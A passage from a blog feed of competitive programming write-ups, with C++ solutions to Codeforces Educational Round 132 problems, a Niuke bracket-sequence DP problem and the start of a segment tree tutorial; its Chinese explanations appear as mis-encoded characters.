class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;a,&amp;b[<span class="number">1</span>],&amp;b[<span class="number">2</span>],&amp;b[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> key=a,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(key)&#123;</span><br><span class="line">        key=b[key];</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Also-Try-Minecraft"><a href="#B-Also-Try-Minecraft" class="headerlink" title="B. Also Try Minecraft"></a>B. Also Try Minecraft</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®è¯´çš„è¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ï¼ŒæŠŠminecraftæŠ½è±¡æˆä¸€ä¸ªäºŒç»´ä¸–ç•Œï¼Œåªæœ‰xå’Œyè½´ï¼Œyè½´å‘ä¸‹ä½ç§»ä¼šå—åˆ°æ‘”è½ä¼¤å®³ï¼Œä½†æ˜¯ä¸Šå‡ä¸ä¼šã€‚ç°åœ¨éœ€è¦æ‰§è¡Œä»»åŠ¡ï¼Œå‘Šè¯‰ä½ æ¯ä¸€åˆ—çš„é«˜åº¦ï¼Œæ¯ä¸ªä»»åŠ¡éœ€è¦ä½ ä»ä¸€åˆ—ä½ç§»åˆ°å¦ä¸€åˆ—ï¼Œé—®ä½ å®Œæˆæ¯ä¸ªä»»åŠ¡éœ€è¦å—åˆ°å¤šå°‘æ‘”è½ä¼¤å®³ã€‚</p><p>è¿™é¢˜ä¹Ÿè¿˜å¯ä»¥ï¼Œå¾ˆéš¾ä¸æƒ³åˆ°ç”¨å‰ç¼€å’Œçš„æ€è·¯å»åšã€‚ä½†æ˜¯å› ä¸ºä¸Šå‡ä¸ä¼šæ‰£è¡€æˆ–è€…åŠ è¡€ï¼Œè€Œå®ƒåˆæœ‰å¯èƒ½ä»åé¢ä½ç§»åˆ°å‰é¢ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç®—å‡ºä¸¤ä¸ªå‰ç¼€å’Œï¼Œç„¶åç›¸å‡å³å¯æ±‚å¾—æ¯ä¸ªäººç‰©éœ€è¦çš„è¡€é‡ï¼Œç„¶åä¸è¦å¿˜äº†å¼€long longã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum1[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+<span class="built_in">max</span>(a[i]-a[i+<span class="number">1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum1[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">    sum2[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        sum2[i]+=sum2[i+<span class="number">1</span>]+<span class="built_in">max</span>(a[i]-a[i<span class="number">-1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum2[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum1[r<span class="number">-1</span>]-sum1[l<span class="number">-1</span>]);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//l==8 r==7</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum2[r+<span class="number">1</span>]-sum2[l+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Recover-an-RBS"><a href="#C-Recover-an-RBS" class="headerlink" title="C. Recover an RBS"></a>C. Recover an RBS</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜å°±æ˜¯æ‘è´ªï¼Œä»å‰å¾€åæ‰«ä¸€éè®¡æ•°ï¼Œå½“æ‰€éœ€çš„å³æ‹¬å·åˆšå¥½ç­‰äºé—®å·æ•°é‡çš„æ—¶å€™ï¼Œé‚£å°±æŠŠå‰é¢çš„å…¨éƒ¨æ¸…é›¶ï¼Œé‡æ–°è®¡æ•°ï¼Œçœ‹çœ‹æœ€åé—®å·æ•°é‡æ˜¯å¦ç­‰äºå·¦æ‹¬å·çš„æ•°é‡å³å¯ã€‚é‚£ä½ å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œä»€ä¹ˆæ—¶å€™é—®å·å˜æˆå·¦æ‹¬å·å‘¢ï¼Ÿé—®å¾—å¥½ï¼Œå› æ­¤æˆ‘ä»¬å¤šå‡ºä¸€ä¸ªï¼Œè®©é—®å·çš„æ•°é‡</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)q++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)cnt++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)cnt--;</span><br><span class="line">        <span class="keyword">if</span>(q+cnt==<span class="number">1</span>)&#123;</span><br><span class="line">            q=<span class="number">0</span>;</span><br><span class="line">            cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==q)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿˜æ˜¯å¤ªèœäº†qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™æ¬¡çš„æ¯”èµ›æ²¡æ‰“ï¼Œä½†æ˜¯è‡ªå·±æ‰“ä¼°è®¡å°±æ˜¯è‡ªé—­ä¸Šå»çš„ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ç‰›å®¢å¤šæ ¡(2022-7-23)é¢˜è§£</title>
    <link href="http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-23T09:00:00.000Z</published>
    <updated>2022-07-23T12:45:15.741Z</updated>
    
    <content type="html"><![CDATA[<p>ç‰›å®¢å¤šæ ¡ç¢°åˆ°æ¯’ç˜¤æ‹¬å·dpé¢˜ï¼Œé¢˜è§£è®°å½•ä¸€ä¸‹ã€‚</p><span id="more"></span><h2 id="Ké¢˜ç›®æè¿°"><a href="#Ké¢˜ç›®æè¿°" class="headerlink" title="Ké¢˜ç›®æè¿°"></a>Ké¢˜ç›®æè¿°</h2><p><img src="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç»™å®šé•¿åº¦ä¸ºnçš„æ‹¬å·åºåˆ—ï¼ˆä¸ä¿è¯åˆæ³•æ€§ï¼‰ï¼Œæ±‚åœ¨æ­¤åŸºç¡€ä¸Šç”Ÿæˆçš„é•¿åº¦ä¸ºmæ‹¬å·åºåˆ—çš„æ–¹æ¡ˆæ•°ã€‚</p><p>è®¾ $dp[i][j][k]$è¡¨ç¤ºæ’å…¥æ‹¬å·çš„æ•°é‡ä¸º $i$ã€ä½¿ç”¨çš„åŸæ¥çš„åºåˆ—ä¸­çš„æ‹¬å·æ•°é‡ä¸º $j$ï¼Œå·¦æ‹¬å·æ¯”å³æ‹¬å·å¤š $k$ æ—¶çš„æ–¹æ¡ˆæ•°ã€‚é‚£ä¹ˆæœ€ç»ˆç­”æ¡ˆä¸º $dp[m-nl[n][0]$ã€‚é‚£ä¹ˆè€ƒè™‘å¦‚ä½•è®¾è®¡çŠ¶æ€è½¬ç§»ï¼š</p><p>é¦–å…ˆæšä¸¾æ’å…¥çš„æ‹¬å·æ•°é‡ï¼ŒåŸæ¥çš„æ‹¬å·åºåˆ—å’Œå·¦æ‹¬å·æ¯”å³æ‹¬å·å¤šçš„æ•°é‡ã€‚<br>å¦‚æœç›®å‰æšä¸¾åˆ°çš„æ‹¬å·ä¸ºå·¦æ‹¬å·ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åŸæ‹¬å·çš„æ•°é‡$&lt; n$ï¼Œå°±å¯ä»¥å°†è¯¥æ‹¬å·æ”¾å…¥æœ€ç»ˆåºåˆ—ä¸­ï¼Œå³ä¸ºï¼š<br>$$<br>dp[i][j+1][k+1]=(dp[i][j+1][k+1]+dp[i][j][k])%mod<br>$$<br>å¦‚æœæ­¤æ—¶æšä¸¾åˆ°çš„æ˜¯ä¸€ä¸ªå³æ‹¬å·ï¼Œå¹¶ä¸”$k&gt;0$ï¼Œå³å·¦æ‹¬å·çš„æ•°é‡å¤§äºå³æ‹¬å·çš„æ•°é‡ï¼Œå¹¶ä¸”ä½¿ç”¨çš„åŸæ‹¬å·çš„æ•°é‡$&lt;n$ï¼Œå°±å°†è¯¥å³æ‹¬å·æ”¾å…¥æœ€ç»ˆåºåˆ—ï¼š<br>$$<br>dp[i][j+1][k-1]=(dp[i][j+1][k-1]+dp[i][j][k])%mod<br>$$<br>å¦‚æœä½¿ç”¨çš„æ‹¬å·æ•°é‡ä¸º $n$ï¼Œæˆ–å½“å‰æšä¸¾åˆ°å³æ‹¬å·ï¼Œåˆ™å¯ä»¥æ’å…¥å·¦æ‹¬å·ï¼š<br>$$<br>dp[i+1][j][k+1]=(dp[i+1][j][k+1]+dp[i][j][k])%mod<br>$$<br>å½“ $k&gt;0$ æ—¶ï¼Œå¦‚æœä½¿ç”¨åŸåºåˆ—æ‹¬å·çš„æ•°ç›®ä¸º $n$ï¼Œæˆ–å½“å‰æšä¸¾åˆ°å·¦æ‹¬å·ï¼Œåˆ™å¯ä»¥æ’å…¥å³æ‹¬å·ï¼š<br>$$<br>dp[i+1][j][k-1]=(dp[i+1][j][k-1]+dp[i][j][k])%mod<br>$$</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> gcc optimize(2)</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">220</span>][<span class="number">220</span>][<span class="number">220</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//memset(dp, 0, sizeof(dp));</span></span><br><span class="line">    <span class="keyword">int</span> n, m; cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    string s; cin &gt;&gt; s;</span><br><span class="line">    <span class="comment">//if(n &amp; 1 || (m - n) &amp; 1) &#123; cout &lt;&lt; 0 &lt;&lt; endl; return; &#125;</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - m; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; ++j)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n; ++k)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                    dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">cout &lt;&lt; dp[n - m][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n + <span class="number">2</span>; k++) dp[i][j][k] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span>; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--) <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç‰›å®¢å¤šæ ¡ç¢°åˆ°æ¯’ç˜¤æ‹¬å·dpé¢˜ï¼Œé¢˜è§£è®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="ç‰›å®¢å¤šæ ¡" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>çº¿æ®µæ ‘ä¸“é¢˜è®­ç»ƒ</title>
    <link href="http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/"/>
    <id>http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/</id>
    <published>2022-07-21T07:00:00.000Z</published>
    <updated>2022-07-21T08:16:21.221Z</updated>
    
    <content type="html"><![CDATA[<p>ç»ƒä¸€ä¸‹çº¿æ®µæ ‘ä¸“é¢˜å§ï¼Œæœ¬ç¯‡åšå®¢æŒç»­æ›´æ–°ï¼</p><span id="more"></span><h1 id="çº¿æ®µæ ‘"><a href="#çº¿æ®µæ ‘" class="headerlink" title="çº¿æ®µæ ‘"></a>çº¿æ®µæ ‘</h1><p>çº¿æ®µæ ‘æ˜¯ç®—æ³•ç«èµ›ä¸­å¸¸ç”¨çš„ç”¨æ¥ç»´æŠ¤ <strong>åŒºé—´ä¿¡æ¯</strong> çš„æ•°æ®ç»“æ„ã€‚</p><p>çº¿æ®µæ ‘å¯ä»¥åœ¨ $O(\log N)$ çš„æ—¶é—´å¤æ‚åº¦å†…å®ç°å•ç‚¹ä¿®æ”¹ã€åŒºé—´ä¿®æ”¹ã€åŒºé—´æŸ¥è¯¢ï¼ˆåŒºé—´æ±‚å’Œï¼Œæ±‚åŒºé—´æœ€å¤§å€¼ï¼Œæ±‚åŒºé—´æœ€å°å€¼ï¼‰ç­‰æ“ä½œã€‚</p><p>çº¿æ®µæ ‘ç»´æŠ¤çš„ä¿¡æ¯åœ¨å¾ˆå¤šæ—¶å€™å¯ä»¥è®¤ä¸ºæ˜¯æ»¡è¶³ï¼ˆå¹ºï¼‰åŠç¾¤çš„æ€§è´¨çš„ä¿¡æ¯ã€‚</p><p>ä¸€ä¸ªå¹ºåŠç¾¤ $M=(S,\circ ,e)$ï¼Œå…¶ä¸­ $\circ$ ä¸ºåœ¨é›†åˆ $S$ ä¸Šå®šä¹‰çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œå¹ºåŠç¾¤å…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š</p><ul><li>å°é—­æ€§ï¼š$\forall x\in S$ å’Œ $\forall y\in S$ æœ‰ $x\circ y\in S$ã€‚</li><li>ç»“åˆå¾‹ï¼š$\forall x,y,z\in S$ æœ‰ $(x\circ y)\circ z=x\circ (y\circ z)$ã€‚</li><li>å­˜åœ¨å¹ºå…ƒï¼šå³ $\exists e\in S$ æ»¡è¶³ $\forall x \in S$ æœ‰ $e\circ x=x$ï¼Œ$e$ ä¸ºå·¦å¹ºå…ƒï¼›æˆ– $x\circ e=x$ï¼Œ$e$ ä¸ºå³å¹ºå…ƒã€‚</li></ul><p>æˆ‘ä»¬è§‚å¯Ÿåˆ°çº¿æ®µæ 